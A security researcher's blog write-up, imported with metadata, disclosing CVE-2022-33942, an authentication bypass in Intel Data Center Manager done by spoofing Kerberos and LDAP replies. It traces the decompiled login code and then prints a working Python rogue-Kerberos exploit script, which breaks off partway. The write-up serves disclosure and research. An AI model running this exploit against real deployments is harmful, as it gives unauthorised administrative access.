---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2022-11-23_from-zero-to-hero-part-1-bypassing-intel-dcms-authentication-by-spoofing-kerbero.md
original_filename: 2022-11-23_from-zero-to-hero-part-1-bypassing-intel-dcms-authentication-by-spoofing-kerbero.md
title: 'From Zero to Hero Part 1: Bypassing Intel DCM’s Authentication by Spoofing
  Kerberos and LDAP Responses (CVE-2022-33942)'
category: documents
detected_topics:
- command-injection
- api-security
- idor
- access-control
- mfa
- otp
tags:
- imported
- documents
- command-injection
- api-security
- idor
- access-control
- mfa
- otp
language: en
raw_sha256: d74e38874e12ada421a2982b7a1ec00f164de226912ab9e7463ab883fa436303
text_sha256: 4828fe4c44a289bfb8be1776d303097dbebd09e04dd7ad9a128acc906374679d
ingested_at: '2026-06-28T07:32:16Z'
sensitivity: unknown
redactions_applied: true
---

# From Zero to Hero Part 1: Bypassing Intel DCM’s Authentication by Spoofing Kerberos and LDAP Responses (CVE-2022-33942)

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2022-11-23_from-zero-to-hero-part-1-bypassing-intel-dcms-authentication-by-spoofing-kerbero.md
- Source Type: markdown
- Detected Topics: command-injection, api-security, idor, access-control, mfa, otp
- Ingested At: 2026-06-28T07:32:16Z
- Redactions Applied: True
- Raw SHA256: `d74e38874e12ada421a2982b7a1ec00f164de226912ab9e7463ab883fa436303`
- Text SHA256: `4828fe4c44a289bfb8be1776d303097dbebd09e04dd7ad9a128acc906374679d`


## Content

---
title: "From Zero to Hero Part 1: Bypassing Intel DCM’s Authentication by Spoofing Kerberos and LDAP Responses (CVE-2022-33942)"
page_title: "From Zero to Hero Part 1: Bypassing Intel … | RCE Security"
url: "https://www.rcesecurity.com/2022/11/from-zero-to-hero-part-1-bypassing-intel-dcms-authentication-cve-2022-33942/"
final_url: "https://www.rcesecurity.com/2022/11/from-zero-to-hero-part-1-bypassing-intel-dcms-authentication-cve-2022-33942/"
authors: ["Julien Ahrens (@MrTuxracer)"]
programs: ["Intel"]
bugs: ["Authentication bypass", "Kerberos", "RCE", "Privilege escalation", "Security code review"]
bounty: "10,000"
publication_date: "2022-11-23"
added_date: "2022-11-25"
source: "pentester.land/writeups.json"
original_index: 1868
---

# From Zero to Hero Part 1: Bypassing Intel DCM's Authentication by Spoofing Kerberos and LDAP Responses (CVE-2022-33942)

Nov 23, 2022 · By [Julien Ahrens](/about/)

## TL;DR

Intel’s [Data Center Manager Console](https://www.intel.com/content/www/us/en/developer/tools/data-center-manager-console/overview.html) is a real-time monitoring and management all-in-one console that allows you to manage your entire data center.

This small series of two blog posts covers an entire vulnerability chain that goes from an unauthenticated user to full remote code execution against Intel’s Data Center Manager (up to version 4.1.1.45749). All described issues were found purely based on a source code review of the decompiled application.

The chain’s first vulnerability bypasses DCM’s entire authentication process if the application is configured to allow authentication from Active Directory groups with publicly known SIDs. Since Intel’s DCM only relies on the SID and there’s no validation of the given active directory service, it is trivially easy to force the application to communicate with an arbitrary Kerberos/LDAP server. The arbitrary server then answers the authentication requests from Intel’s DCM by simply returning a successful authentication, including a known/matching SID. This ultimately allows authenticating using any user with any password and any Active Directory domain.

Intel has released its security advisory [INTEL-SA-00713](https://www.intel.com/content/www/us/en/security-center/advisory/intel-sa-00713.html) about this issue and has assigned [CVE-2022-33942](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-33942) to it.

Thanks, rootkid, for proofreading!

## Vulnerable Configuration

Let’s assume that an administrator configured the group Guests of the domain rce.local to be allowed to access the DCM with the lowest possible rights, which is DCM’s Guest level:

![](/2022/11/from-zero-to-hero-part-1-bypassing-intel-dcms-authentication-cve-2022-33942/images/dcm-auth-bypass-1-1-1024x147.e1578ff16e4057f094f9881cbab5a265e4e63ddb4ab09a841332a71b1aa4f180.png)

Whereof the Guests group only has no current group members:

![](/2022/11/from-zero-to-hero-part-1-bypassing-intel-dcms-authentication-cve-2022-33942/images/dcm-auth-bypass-2.5d36e87919fc9d5c38431769c513638b21196c3aa616068ee711fb7ddacc5af1.png)

Based on this configuration, you could assume that this configuration is secure because:

  1. You have to be a member of the Guests group within the rce.local domain

  2. You have to know the password of any member of the Guests group

Let’s prove that you’re wrong.

## Authentication Options

When hitting DCM on port 8643 using HTTPS, you are presented with a typical authentication screen of the DcmConsole. Here, you can also select AD Account as an authentication type, which will show an additional field called Domain:

![](/2022/11/from-zero-to-hero-part-1-bypassing-intel-dcms-authentication-cve-2022-33942/images/dcm-auth-bypass-3.2ebbddb2acd642f5c808f79ecfc5a3d9a6f69aa6b492fc1a4f385f58c0faec22.png)

So what happens if you try to authenticate using this option: The application issues an HTTP POST request which has its type set to 1:
  
  
  POST /DcmConsole/login/login HTTP/1.1
  Host: 192.168.178.22:8643
  Content-Length: 175
  Sec-Ch-Ua: "(Not(A:Brand";v="8", "Chromium";v="99"
  Accept: application/json, text/plain, */*
  Content-Type: text/plain
  Sec-Ch-Ua-Mobile: ?0
  User-Agent: Mozilla/5.0
  Sec-Ch-Ua-Platform: "macOS"
  Origin: https://192.168.178.22:8643
  Sec-Fetch-Site: same-origin
  Sec-Fetch-Mode: cors
  Sec-Fetch-Dest: empty
  Referer: https://192.168.178.22:8643/DcmConsole/
  Accept-Encoding: gzip, deflate
  Accept-Language: en-GB,en-US;q=0.9,en;q=0.8
  Connection: close
  
  {"antiCSRFId":null,"requestObj":{"name":"mrtuxracer","password":"Password0","type":1,"domain":"hack.local","loginTime":"Sun Jun 26 2022 12:05:07 GMT+0200 (Central European Summer Time)"}}
  

## Source Code Review FTW

I will guide you step-by-step through how I discovered this vulnerability and will utilize an arbitrary Kerberos and LDAP server implementation via Python to exploit it. My exploit only assumes that you have control over a custom domain (I’m using hack.local for demo purposes). I have also hardcoded the Active Directory password Password0 into the script, meaning you can choose any user you want, but you must use that password for Kerberos reasons.

### Spoofing a Kerberos Authentication Server

Most of the responsible source code can be found in the ``com.intel.console.server.login.UserMgmtHandler`` class.

The first important thing here is the differentiation between the authentication types specified by the type parameter. When selecting type 1 (aka Active Directory), the function `loginAD()` is called on line 1030, which hands over all the request values, including the username, password, and the domain:
  
  
  /*  */  public static int login(HttpServletRequest request, int type, String name, String password, String domain, boolean noSession) throws ConsoleAuthCheckException {
  /* 1022 */  List exceededSessions = new LinkedList<>();
  /* 1023 */  int userType = 2;
  /*  */  
  /* 1025 */  if (type == 0) {
  /* 1026 */  logout(request, noSession);
  /* 1027 */  userType = loginConsole(request, name, password, exceededSessions, noSession);
  /* 1028 */  } else if (type == 1) {
  /* 1029 */  logout(request, noSession);
  /* 1030 */  userType = loginAD(request, name, password, domain, exceededSessions, noSession);
  /* 1031 */  } else if (type == 2) {
  /* 1032 */  logout(request, noSession);
  /* 1033 */  userType = loginLDAP(request, name, password, exceededSessions, noSession);
  /*  */  } 
  

The method `loginAD()` does a couple of preflight things, such as getting the full domain name (line 1190) and getting the pure user name (line 1191). This is because you could also authenticate using the username@domain schema, for example, against DCM’s REST API. The resulting values are then used as `java.security.krb5` properties, which is at the same time the first significant piece of the puzzle - the attacker can control the kdc/realm of the authenticating server:
  
  
  /*  */  public static int loginAD(HttpServletRequest request, String name, String password, String domain, List exceededSessions, boolean noSession) throws ConsoleAuthCheckException {
  /* 1187 */  HttpSession session = noSession ? null : request.getSession(true);
  /* 1188 */  Subject subject = new Subject();
  /*  */  
  /* 1190 */  String fullDomain = getFullDomain(name, domain);
  /* 1191 */  String pureUser = getPureUser(name); 
  /*  */  
  /* 1193 */  System.setProperty("java.security.krb5.kdc", fullDomain.toUpperCase(Locale.ENGLISH));
  /* 1194 */  System.setProperty("java.security.krb5.realm", fullDomain.toUpperCase(Locale.ENGLISH));
  

Next comes the authentication process itself, which is based on Kerberos v5 and which will fail if the Kerberos authentication is not successful (lines 1201 to 1203):
  
  
  /* 1196 */  LoginContext lc = null;
  /*  */  
  /*  */  try {
  /* 1199 */  lc = new LoginContext("Krb5Login", subject, new DcmLoginCallbackHandler(pureUser, password));
  /*  */  
  /* 1201 */  lc.login();
  /* 1202 */  } catch (LoginException le) {
  /* 1203 */  handleAuthenticationException(le);
  /*  */  } 
  

So, how do we get past this check if we have control over the domain? Correct: We need to build an arbitrary Kerberos server to answer the authentication request and return a successful authentication.

### AS_REQ

Let’s quickly dive into the Kerberos v5 authentication process and how DCM uses it. When the ``login()`` call on line 1201 is reached, DCM sends an ``AS_REQ`` request to the given Kerberos server. This request looks like the following:

![](/2022/11/from-zero-to-hero-part-1-bypassing-intel-dcms-authentication-cve-2022-33942/images/dcm-auth-bypass-4.190386d0a31742954ac12194d3c0acb9176883d6520062fce1fdc2c80732cc17.png)

To answer the `AS_REQ` request, extracting a couple of information from the request is essential:

  * **nonce** \- the answer must also contain the nonce that the client (DCM) provided. The intention is to prevent replay attacks.

  * **realm** \- this is essentially the requested Active Directory domain and is required for the AS_REP

  * **username** \- this is the Active Directory user which we need to return a successful authentication for.

  * **etype** \- these are the encryption algorithms that the client supports. We don’t need to extract those but just choose one for the response.

### AS_REP

In response to the `AS_REQ` the arbitrary Kerberos server will answer with an `AS_REP` message, which looks like the following:

![](/2022/11/from-zero-to-hero-part-1-bypassing-intel-dcms-authentication-cve-2022-33942/images/dcm-auth-bypass-5.b267424b8d389b10f55e92f37f532b73f99753f415a99f6957ca91ba7a09fdd3.png)

The first etype points to the encryption algorithm, followed by the realm and the username, aka CNameString. The most important part is the enc-part at the end of the message because it is an authentication proof. It is a data blob encrypted by the Kerberos server using the user’s password, which the Kerberos fetched from its database. If the user also supplied the same password during the authentication process, DCM can successfully decrypt and read its contents.

The decrypted enc-part looks like the following:
  
  
  key=EncryptionKey:
  keytype=18
  keyvalue=0x2deb4c8d3c541791c23080ab***REDACTED-SUSPECT-TOKEN***  last-req=LastReq:
  Sequence:
  lr-type=0
  lr-value=20220627111947Z
  
  nonce=76839024
  key-expiration=20370914024805Z
  flags=6356992
  authtime=20220627111947Z
  endtime=20220627211947Z
  srealm=HACK.LOCAL
  sname=PrincipalName:
  name-type=2
  name-string=SequenceOf:
  krbtgt  HACK.LOCAL
  

Some key data points here are:

  * **nonce** \- This is the same nonce value that the client presented within the AS_REQ message and reused here for integrity validation purposes

  * **authtime** \- This is used to make sure there are no clock skews, as well as the request, isn’t replayed

  * **endtime** \- This is used to specify the validity of the data

  * **srealm** \- This matches the realm from the AS_REQ

My final exploit automagically sets all the required values and encrypts the enc-part using the hardcoded password Password0, making the DCM pass the Kerberos authentication successfully.

### Returning Arbitrary LDAP Objects

After passing the Kerberos authentication, the application switches over to LDAP by using the `com.intel.console.server.login.ADHelper` class (line 1206, 1215-1216). This means that we also need an arbitrary LDAP server to answer any incoming LDAP queries from the DCM.

The `init()` method here simply prepares the LDAP connection to the very same host given by the `fullDomain` variable, which we do have under control, and finally causes an LDAP bindRequest (line 1216):
  
  
  /* 1206 */  ADHelper adHelper = null;
  /* 1207 */  int[] userType = { 2 };
  /*  */  
  /*  */  try {
  /* 1210 */  String domainUserName = getDomainUser(name, fullDomain);
  /* 1211 */  Boolean enbaleTls = Boolean.valueOf(Boolean.parseBoolean(Configuration.getProperty(InternalProperty.ENABLE_AD_TLS
  /* 1212 */  .name())));
  /* 1213 */  int adPort = Integer.parseInt(Configuration.getProperty(InternalProperty.AD_PORT
  /* 1214 */  .name()));
  /* 1215 */  adHelper = new ADHelper(fullDomain, adPort, domainUserName, password, enbaleTls);
  /* 1216 */  adHelper.init();
  

The ``bindRequest`` looks like the following:

![](/2022/11/from-zero-to-hero-part-1-bypassing-intel-dcms-authentication-cve-2022-33942/images/dcm-auth-bypass-6.352a561b6f6abddbd90e6444f53ff583736a7d063f30768350e2badddfe0ff57.png)

And will be answered by our arbitrary LDAP server using a bind success message, which looks like the following:

![](/2022/11/from-zero-to-hero-part-1-bypassing-intel-dcms-authentication-cve-2022-33942/images/dcm-auth-bypass-7.5e71fa75b88f8918983622218b4681c51382d6ed33fd06d62eb6d122db06f93f.png)

The next few lines are more important:
  
  
  /* 1218 */  String userSid = adHelper.getUserSid(pureUser);
  /* 1219 */  UserInfo[] userInfo = getUsersBySidAndDomain(userSid, fullDomain);
  /* 1220 */  DcmUserPrincipal userPrincipal = createUserPrincipal(domainUserName, userInfo, 1, userType);
  

First, the call to `getUserSid()` (line 1218) constructs an LDAP search query (line 73) and performs the actual LDAP searchRequest (line 80) to return the objects SID (lines 82-86) or otherwise null if the queried user isn’t found:
  
  
  /*  */  public String getUserSid(String userName) throws NamingException {
  /*  72 */  String searchBase = makeRootBase();
  /*  73 */  String searchFilter = "(&(objectClass=user)(sAMAccountName=" + userName + "))";
  /*  */ 
  /*  */  
  /*  76 */  SearchControls searchControls = new SearchControls();
  /*  77 */  searchControls.setSearchScope(2);
  /*  78 */  searchControls.setReturningAttributes(new String[] { "objectSID" });
  /*  */  
  /*  80 */  NamingEnumeration results = this.ctx.search(searchBase, searchFilter, searchControls);
  /*  */  
  /*  82 */  SearchResult result = null;
  /*  83 */  if (results.hasMoreElements()) {
  /*  84 */  result = results.nextElement();
  /*  85 */  return buildSid((byte[])result.getAttributes()
  /*  86 */  .get("objectSID").get());
  /*  */  } 
  /*  */  
  /*  89 */  return null;
  /*  */  }
  

The raw ``searchRequest`` looks like the following:

![](/2022/11/from-zero-to-hero-part-1-bypassing-intel-dcms-authentication-cve-2022-33942/images/dcm-auth-bypass-8.e1465190d54c09cd91167e5675968ee70a88d20ea8c07cb4a38002dedcfdae29.png)

However, our arbitrary LDAP server will return a SID for any queried user of ``S-1-5-4294967295-4294967295-4294967295-4294967295-4294967295`` (hex: ``0x0105000000000005ffffffffffffffffffffffffffffffffffffffff``), which is important to pass another check later on:

![](/2022/11/from-zero-to-hero-part-1-bypassing-intel-dcms-authentication-cve-2022-33942/images/dcm-auth-bypass-9.57cfb9e368a457ab28df16bd890f4de1ae4dfc55a301c3cc691ed8d35b7e7b08.png)

The call to ``getUsersBySidAndDomain()`` on line 1219 finally constructs a SQL query validating the previously received `sid` against DCM’s database (line 421):
  
  
  /*  */  private static UserInfo[] getUsersBySidAndDomain(String sid, String domain) throws ConsoleDbException {
  /*  415 */  List userList = new LinkedList<>();
  /*  416 */  Connection conn = ConnectionProvider.getConnection();
  /*  417 */  PreparedStatement statement = null;
  /*  418 */  ResultSet res = null;
  /*  */  
  /*  */  try {
  /*  421 */  String query = "select \"id\", \"name\", \"description\",\"type\",\"domain\",\"account_type\",\"sid\" from \"T_User\" where sid=? and domain=?";
  /*  */  
  /*  423 */  statement = conn.prepareStatement(query);
  /*  424 */  int paramIndex = 1;
  /*  425 */  statement.setString(paramIndex++, sid);
  /*  426 */  statement.setString(paramIndex++, domain);
  /*  427 */  res = statement.executeQuery();
  [...]
  /*  462 */  return userList.toArray(new UserInfo[userList.size()]);
  /*  */  }
  

However, since we’re using our own arbitrary Kerberos/LDAP, which returns a random SID here (the SID of real users are impossible to guess), it’ll return an empty ``userList`` on line 462:

![](/2022/11/from-zero-to-hero-part-1-bypassing-intel-dcms-authentication-cve-2022-33942/images/dcm-auth-bypass-10-1024x332.de166feed977edf24931b81d26034e3d58c1bdb7de9a85b5142585f12703178c.png)

Since `userList` is empty, the call to the next method `createUserPrincipal()` on line 1220 will also return `null` resulting in `userPrincipal` also becoming `null`:
  
  
  /*  */  private static DcmUserPrincipal createUserPrincipal(String userName, UserInfo[] userInfo, int accountType, int[] userType) {
  /* 1276 */  if (userInfo == null || userInfo.length == 0) {
  /* 1277 */  return null;
  /*  */  }
  

![](/2022/11/from-zero-to-hero-part-1-bypassing-intel-dcms-authentication-cve-2022-33942/images/dcm-auth-bypass-11-1024x343.b613bc4a9187f838b38e4358c6e1fb28c8ec087d9045534954a99c174d9020f6.png)

This implementation is aimed at the single Active Directory user authentication process. However, we cannot exploit this route since we don’t know (and cannot guess) the SID of any single user object of an Active Directory.

### Confusing DCM with Known SIDs

What happens next is a check whether `userPrincipal` is null (line 1222). Since the single-user authentication process failed, the next logical step is verifying whether the user’s group is allowed to authenticate because this is an actual authentication option in DCM. This happens by using the following sequence to fetch the user’s Active Directory group information:
  
  
  /* 1222 */  if (userPrincipal == null) {
  /* 1223 */  String[] groupNames = adHelper.getUserGroupSid(userSid);
  /* 1224 */  UserInfo[] groupInfo = getUserGroupInfo(groupNames);
  /* 1225 */  userPrincipal = createUserPrincipal(domainUserName, groupInfo, 2, userType);
  /*  */  } 
  

The call on line 1223 passes our arbitrary user SID of ``S-1-5-4294967295-4294967295-4294967295-4294967295-4294967295`` into ``getUserGroupSid()`` where a search for the given user SID happens on line 122:
  
  
  /*  */  public String[] getUserGroupSid(String userSid) throws NamingException {
  /* 114 */  String searchBase = makeRootBase();
  /* 115 */  String searchFilter = "(&(objectClass=user)(objectSid=" + userSid + "))";
  /*  */  
  /* 117 */  SearchControls searchControls = new SearchControls();
  /* 118 */  searchControls.setSearchScope(2);
  /* 119 */  searchControls.setReturningAttributes(new String[] { "distinguishedName" });
  /*  */ 
  /*  */  
  /* 122 */  NamingEnumeration results = this.ctx.search(searchBase, searchFilter, searchControls);
  /*  */  
  /* 124 */  SearchResult result = null;
  /* 125 */  if (results.hasMoreElements()) {
  /* 126 */  result = results.nextElement();
  /*  */  
  /* 128 */  String dn = (String)result.getAttributes().get("distinguishedName").get();
  /*  */  
  /* 130 */  SearchControls searchContext = new SearchControls(0, 0L, 0, new String[] { "tokenGroups" }, false, false);
  /*  */ 
  /*  */  
  /* 133 */  results = this.ctx.search(dn, "(&(objectClass=user))", searchContext);
  /* 134 */  if (results.hasMoreElements()) {
  /* 135 */  SearchResult item = results.next();
  /* 136 */  Attributes metadata = item.getAttributes();
  /* 137 */  Attribute attribute = metadata.get("tokenGroups");
  /* 138 */  NamingEnumeration tokens = attribute.getAll();
  /* 139 */  List ret = new LinkedList<>();
  /* 140 */  while (tokens.hasMore()) {
  /* 141 */  byte[] sid = (byte[])tokens.next();
  /* 142 */  ret.add(buildSid(sid));
  /*  */  } 
  /* 144 */  return ret.toArray(new String[ret.size()]);
  /*  */  } 
  /*  */  } 
  /*  */  
  /* 148 */  return null;
  /*  */  }
  

This causes two more LDAP queries. The first one is for the user object:

![](/2022/11/from-zero-to-hero-part-1-bypassing-intel-dcms-authentication-cve-2022-33942/images/dcm-auth-bypass-12.cb1166e406bd94f6a216d9ed1de6d52bc8c5923bbcab720ccfd88cdd560dff06.png)

which our arbitrary LDAP server always answers regardless of the user SID by simply returning an arbitrary ``distinguishedName``:

![](/2022/11/from-zero-to-hero-part-1-bypassing-intel-dcms-authentication-cve-2022-33942/images/dcm-auth-bypass-13.4b80f0866c19c53dd567b367f0a926aec4987deb9fab3ab41d57465c25cd56e0.png)

The second LDAP query (line 133) queries for the ``tokenGroups`` (aka the group SIDs) of the given user:

![](/2022/11/from-zero-to-hero-part-1-bypassing-intel-dcms-authentication-cve-2022-33942/images/dcm-auth-bypass-14.087fa42c0e3369d3815294bcfc4bbf4a2effed82486d7438f99a000fc1722961.png)

Since our arbitrary LDAP server knows the SID S-1-5-4294967295-4294967295-4294967295-4294967295-4294967295, it will happily answer this request for the user’s group SIDs by responding with S-1-5-32-546 (hex: 0x01020000000000052000000022020000), S-1-5-32-545 (hex: 0x01020000000000052000000020020000) and another random ID. Thereby, the first two group SIDs are called [“well-known-sids”](https://docs.microsoft.com/en-us/windows/win32/secauthz/well-known-sids) and represent the Guests group and the Users group:

![](/2022/11/from-zero-to-hero-part-1-bypassing-intel-dcms-authentication-cve-2022-33942/images/dcm-auth-bypass-15.2d13b375cb2c1adf79c9981ba12edbd06608a7f253e376c4a01c6280a7610235.png)

This means that the `groupNames` array (line 1222) is now filled with the returned group SIDs and is passed into the `getUserGroupInfo()` call on line 1224:

![](/2022/11/from-zero-to-hero-part-1-bypassing-intel-dcms-authentication-cve-2022-33942/images/dcm-auth-bypass-16.d6fd0e11fdc9cb76e724a068f88373836d12ba3a59f7edc5540f317a43a84db6.png)

``getUserGroupInfo()`` essentially builds a SQL query condition based on the different SIDs (lines 1312-1324):
  
  
  /*  */  private static UserInfo[] getUserGroupInfo(String[] groups) throws ConsoleDbException {
  /* 1310 */  UserInfo[] groupInfo = null;
  /*  */  
  /* 1312 */  if (groups != null && groups.length != 0) {
  /* 1313 */  String condition = "";
  /* 1314 */  for (String groupSid : groups) {
  /* 1315 */  if (condition.isEmpty()) {
  /* 1316 */  condition = condition + "(";
  /*  */  } else {
  /* 1318 */  condition = condition + ",";
  /*  */  } 
  /* 1320 */  condition = condition + "'" + condition + "'";
  /*  */  } 
  /*  */  
  /* 1323 */  condition = condition + ")";
  /* 1324 */  groupInfo = getUsers(" sid in " + condition);
  /*  */  } 
  /* 1326 */  return groupInfo;
  /*  */  }
  

and finally passes the condition to another ``getUsers()`` call:

![](/2022/11/from-zero-to-hero-part-1-bypassing-intel-dcms-authentication-cve-2022-33942/images/dcm-auth-bypass-17.8c15951af336c1b19c8eebfae264a249789ccde939d572fae480c0fa3ab7b3d9.png)

``getUsers()`` in return performs an SQL query that checks whether the given SID exists in the database:
  
  
  /*  */  private static UserInfo[] getUsers(String condition) throws ConsoleDbException {
  /*  517 */  List userList = new LinkedList<>();
  /*  */  
  /*  519 */  Connection conn = ConnectionProvider.getConnection();
  /*  520 */  PreparedStatement statement = null;
  /*  521 */  ResultSet res = null;
  /*  */  
  /*  */  try {
  /*  524 */  String query = "select \"id\", \"name\", \"description\",\"type\",\"domain\",\"account_type\",\"sid\" from \"T_User\" where " + condition;
  /*  */  
  /*  526 */  statement = conn.prepareStatement(query);
  /*  527 */  res = statement.executeQuery();
  [...]
  

![](/2022/11/from-zero-to-hero-part-1-bypassing-intel-dcms-authentication-cve-2022-33942/images/dcm-auth-bypass-18-1024x375.3a4cc90ff21304130fb8af183fb393c64adb5aad74c11e853308bb791faa2aa6.png)

Since the administrator has actually configured the Guests group to be able to authenticate, it returns a couple of things, including the group name and its SID:

![](/2022/11/from-zero-to-hero-part-1-bypassing-intel-dcms-authentication-cve-2022-33942/images/dcm-auth-bypass-19.7be7ab8d7de4a02c0461533562348d9d1bc1b58b866c48a5531ca7cf2b1ddca6.png)

The last call in the authentication sequence goes to `createUserPrincipal()`, which includes the data of the previous SQL query and ultimately checks whether the given user is present in DCM’s allowed users list:
  
  
  /*  */  private static DcmUserPrincipal createUserPrincipal(String userName, UserInfo[] userInfo, int accountType, int[] userType) {
  /* 1276 */  if (userInfo == null || userInfo.length == 0) {
  /* 1277 */  return null;
  /*  */  }
  /*  */  
  /* 1284 */  Map<integer, list<userinfo="">> usersByType = (Map<integer, list<userinfo="">>)Arrays.stream(userInfo).collect(Collectors.groupingBy(UserInfo::getType));
  /*  */  
  /* 1290 */  int[] userTypeOrder = { 1, 3, 4, 2 };
  /*  */  
  /* 1292 */  for (int type : userTypeOrder) {
  /* 1293 */  List userList = usersByType.get(Integer.valueOf(type));
  /* 1294 */  if (userList != null && !userList.isEmpty()) {
  /*  */ 
  /*  */ 
  /*  */  
  /* 1298 */  Collections.sort(userList);
  /* 1299 */  List userIds = (List)userList.stream().map(UserInfo::getId).collect(Collectors.toList());
  /* 1300 */  userType[0] = type;
  /* 1301 */  return new DcmUserPrincipal(userName, userIds, accountType);
  /*  */  } 
  /*  */  } 
  /*  */  
  /* 1305 */  return null;
  /*  */  }</integer,></integer,>
  

Since the group `S-1-5-32-546` is authorized to authenticate against DCM, and our arbitrary LDAP server returned a random user object, which has the same group SID set; DCM happily proceeds with authenticating the user by returning a `DcmUserPrincipal` object:

![](/2022/11/from-zero-to-hero-part-1-bypassing-intel-dcms-authentication-cve-2022-33942/images/dcm-auth-bypass-20-1024x755.f359f13a0f00ba051adf202ffb9bc7198248d7e4098cebf82c8f0c94a1e509c8.png)

This ultimately means that it is possible to authenticate against DCM using any username, and any domain name because the only thing being validated here is the user group’s SID.

![](/2022/11/from-zero-to-hero-part-1-bypassing-intel-dcms-authentication-cve-2022-33942/images/dcm-auth-bypass-21-1024x375.830f592922b3e7f098b51f440b91306917adae9a708379f84ccd83da3e456272.png)

## Auto-Exploitation

I’ve put together a rather complex script to exploit this vulnerability:
  
  
  import socket
  import struct
  import binascii
  
  from ldap3.protocol.rfc4511 import SearchResultReference
  from pyasn1.codec.der import decoder, encoder
  from pyasn1.codec.ber.encoder import encode
  from pyasn1.type.univ import noValue
  from datetime import datetime, timedelta
  
  from impacket.krb5 import constants
  from impacket.krb5.crypto import (Key, Enctype, encrypt, _AES256CTS)
  from impacket.krb5.asn1 import AS_REQ, AS_REP, ETYPE_INFO2, EncASRepPart
  
  from ldap3.protocol.rfc4511 import (
  LDAPMessage, MessageID, ProtocolOp,  BindResponse, ResultCode, SearchResultDone,
  SearchResultEntry, LDAPDN, PartialAttributeList, PartialAttribute,
  AttributeDescription, Vals, AttributeValue
  )
  
  listen_ip = "0.0.0.0"
  
  with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as s:
  # Bind the socket to the port
  server_address = (listen_ip, 88)
  s.bind(server_address)
  
  while True:
  print("\n[+] Waiting for incoming Kerberos UDP Request")
  data, address = s.recvfrom(4096)
  print("[+] Received connection from {}".format(address))
  
  if data:
  # Refuse UDP connection with a KRB4KRB_ERR_RESPONSE_TOO_BIG
  # Details of the response don't really matter such as the domain name
  payload1 = bytes.fromhex("7e583056a003020105a10302011ea411180f32303232303631303134353030375aa50502030a6c5fa603020134a90b1b095243452e4c4f43414caa1e301ca003020102a11530131b066b72627467741b095243452e4c4f43414c")
  sent = s.sendto(payload1, address)
  break
  
  s.close()
  
  print("[+] Answered Kerberos UDP Authentication Request")
  
  # Let's open up port 88 for Kerberos v5 interactions
  with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
  print("[+] Waiting for incoming Kerberos TCP Request")
  s.bind((listen_ip, 88))
  s.listen()
  conn, address = s.accept()
  with conn:
  print("[+] Received Kerberos connection from {}".format(address))
  while True:
  recvDataLen = struct.unpack('!i', conn.recv(4))[0]
  r = conn.recv(recvDataLen)
  while len(r) < recvDataLen:
  r += conn.recv(recvDataLen - len(r))
  
  # Let's first parse the AS_REQ
  asReq = decoder.decode(r, asn1Spec=AS_REQ())[0]
  
  # Let's get a couple of things from the initial request required to build further responses
  nonce = asReq['req-body']['nonce']
  realm = str(asReq['req-body']['realm'])
  username = str(asReq['req-body']['cname']['name-string'][0])
  
  # Do some crypto stuff
  # salt is composed of the realm concatenated with the username
  salt = realm + username
  aesKey = _AES256CTS.string_to_key("Password0", salt, params=None).contents
  key = Key(Enctype.AES256, aesKey)
  
  # Some pre-recoded AS_REP message (encrypted part only)
  plainText = binascii.unhexlify("7981da3081d7a02b3029a003020112a12204202deb4c8d3c541791c23080abf14d896bc27609e24f80a15911d0720ec83d5237a11c301a3018a003020100a111180f32303232303631383133323432315aa20602040c3c5eb6a311180f32303337303931343032343830355aa40703050000610000a511180f32303232303631383133323432315aa611180f32303232303631383133323432315aa711180f32303232303631383233323432315aa90c1b0a4841434b2e4c4f43414caa1f301da003020102a11630141b066b72627467741b0a4841434b2e4c4f43414c")
  
  # Use some random confounder
  confounder = binascii.unhexlify("13371337133713371337133713371337") # first 16 bytes of an AS_REP message
  
  encASRepPart = decoder.decode(plainText, asn1Spec=EncASRepPart())[0]
  
  # Modify nonce to match the client's nonce
  encASRepPart['nonce'] = int(nonce)
  
  # Change timestamps to not screw any clock diffs
  my_date = datetime.now()
  current_timestamp = my_date.strftime('%Y%m%d%H%M%SZ')
  encASRepPart['authtime'] = current_timestamp
  encASRepPart['last-req'][0]['lr-value'] = current_timestamp
  
  # this is to make sure no clock scew occurs, because if starttime isn't present, the KDC's time is taken
  # see RFC4120 3.1.3 at https://datatracker.ietf.org/doc/html/rfc4120#page-48
  encASRepPart['starttime'] = noValue
  
  # Endtime + 10 hours
  newEndTime = datetime.now() + timedelta(hours=10)
  encASRepPart['endtime'] = newEndTime.strftime('%Y%m%d%H%M%SZ')
  
  # Modify realms
  encASRepPart['srealm'] = realm
  encASRepPart['sname']['name-string'][1] = realm
  
  # encrypt again
  final = encrypt(key, 3, encoder.encode(encASRepPart), confounder)
  
  # Construct an AS_REP
  asRep = AS_REP()
  asRep['pvno'] = 5
  asRep['msg-type'] = int(constants.ApplicationTagNumbers.AS_REP.value)
  
  asRep['padata'] = noValue
  asRep['padata'][0] = noValue
  asRep['padata'][0]['padata-type'] = constants.PreAuthenticationDataTypes.PA_ETYPE_INFO2.value
  
  etype2 = ETYPE_INFO2()
  etype2[0] = noValue
  etype2[0]['etype'] = constants.EncryptionTypes.aes256_cts_hmac_sha1_96.value
  etype2[0]['salt'] = salt
  encodedEtype2 = encoder.encode(etype2)
  asRep['padata'][0]['padata-value'] = encodedEtype2
  
  asRep['crealm'] = realm
  
  asRep['cname'] = noValue
  asRep['cname']['name-type'] = constants.PrincipalNameType.NT_PRINCIPAL.value
  asRep['cname']['name-string'] = noValue
  asRep['cname']['name-string'][0] = username
  
  asRep['ticket'] = noValue
  asRep['ticket']['tkt-vno'] = constants.ProtocolVersionNumber.pvno.value
  asRep['ticket']['realm'] = realm
  asRep['ticket']['sname'] = noValue
  asRep['ticket']['sname']['name-string'] = noValue
  asRep['ticket']['sname']['name-string'][0] = "krbtgt"
  asRep['ticket']['sname']['name-type'] = constants.PrincipalNameType.NT_SRV_INST.value
  asRep['ticket']['sname']['name-string'][1] = realm
  
  asRep['ticket']['enc-part'] = noValue
  asRep['ticket']['enc-part']['kvno'] = 2
  asRep['ticket']['enc-part']['etype'] = constants.EncryptionTypes.aes256_cts_hmac_sha1_96.value
  # Using a pre-encrypted ticket here. The ticket itself doesn't matter since it's not used
